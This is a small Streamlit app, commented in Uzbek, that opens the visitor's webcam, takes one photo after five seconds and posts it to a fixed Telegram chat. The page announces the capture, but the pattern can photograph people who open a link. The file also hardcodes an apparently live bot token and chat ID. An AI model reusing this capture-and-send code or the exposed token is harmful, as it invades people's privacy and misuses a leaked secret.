import streamlit as st
from streamlit_webrtc import webrtc_streamer
import cv2
import tempfile
import threading
import time
import requests

# Telegram sozlamalari
BOT_TOKEN = '7899690264:AAH14dhEGOlvRoc4CageMH6WYROMEE5NmkY'      # Bot tokeningizni shu yerga yozing
CHAT_ID = '-1002671611327'          # Admin chat_id sini shu yerga yozing

def send_to_telegram(image_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(image_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID, "caption": caption}
        response = requests.post(url, files=files, data=data)
        return response.ok

class VideoProcessor:
    def __init__(self):
        self.frame = None
        self.image_saved = False

    def recv(self, frame):
        img = frame.to_ndarray(format="bgr24")
        self.frame = img
        return frame

def capture_and_send(processor):
    # 5 soniya kutish (kamera to‘liq ishga tushishi uchun)
    time.sleep(5)
    if processor.frame is not None and not processor.image_saved:
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmpfile:
            cv2.imwrite(tmpfile.name, processor.frame)
            processor.image_saved = True
            success = send_to_telegram(tmpfile.name, "📷 Avtomatik olingan surat")
            if success:
                st.success("✅ Surat Telegramga yuborildi.")
            else:
                st.error("❌ Suratni Telegramga yuborishda xatolik yuz berdi.")

st.title("📸 Avtomatik Kamera Surat olish va Telegramga yuborish")

processor = VideoProcessor()
webrtc_ctx = webrtc_streamer(key="example", video_processor_factory=lambda: processor)

if webrtc_ctx.state.playing and not processor.image_saved:
    threading.Thread(target=capture_and_send, args=(processor,), daemon=True).start()
    st.info("Kamera ishga tushdi, 5 soniyadan keyin surat olinadi va Telegramga yuboriladi.")
